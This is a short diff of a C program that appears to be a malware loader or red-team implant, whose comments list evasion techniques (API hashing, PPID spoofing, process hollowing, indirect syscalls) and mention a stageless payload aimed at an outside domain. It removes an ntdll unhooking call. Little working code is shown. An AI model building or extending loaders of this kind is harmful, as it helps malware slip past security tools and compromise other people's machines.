@@ -9,14 +9,10 @@ int main()
 {
     // Compile Time API Hashing
     // Run-Time Dynamic Linking 
-    // Ntdll unhooking
     // PPID spoofing
     // Process hollowing
+    // Indirect syscalls execution
     
-
-
-    unhook();
-
     DWORD pid = GetPID();
     
     // Raw stageless payload targetting microsoft.lestutosdeprocessus.fr
